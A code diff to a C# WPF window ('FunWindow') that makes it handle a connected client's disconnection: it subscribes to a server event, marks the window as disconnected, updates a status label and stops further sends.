@@ -11,6 +11,7 @@ public partial class FunWindow : ThemedWindow
 {
     private readonly TlsServer _server;
     private readonly string    _clientId;
+    private bool               _disconnected;
 
     // Tag="on" → active (blue accent), Tag="off" → dimmed inactive, null → unknown/reset
     private static void Activate(System.Windows.Controls.Button active, params System.Windows.Controls.Button[] others)
@@ -39,11 +40,13 @@ public partial class FunWindow : ThemedWindow
             }
             catch { }
         });
+        _server.ClientDisconnected += OnClientDisconnected;
         Lang.LanguageChanged += ApplyLanguage;
         ApplyLanguage();
         Closed += (_, _) =>
         {
             _server.UnregisterHandler(clientId, PacketType.FunResult);
+            _server.ClientDisconnected -= OnClientDisconnected;
             Lang.LanguageChanged -= ApplyLanguage;
         };
     }
@@ -90,8 +93,19 @@ public partial class FunWindow : ThemedWindow
         if (LblFunSec           != null) LblFunSec.Text              = Lang.Get("FUN_LBL_SEC");
     }
 
+    private void OnClientDisconnected(SeroServer.Data.ConnectedClient c)
+    {
+        if (c.Id != _clientId) return;
+        Dispatcher.BeginInvoke(() =>
+        {
+            _disconnected = true;
+            TxtStatus.Text = Lang.Get("PM_DISCONNECTED");
+        });
+    }
+
     private async Task Send(string action, string param = "")
     {
+        if (_disconnected) return;
         try
         {
             TxtStatus.Text = string.Format(Lang.Get("FUN_SENDING"), action);
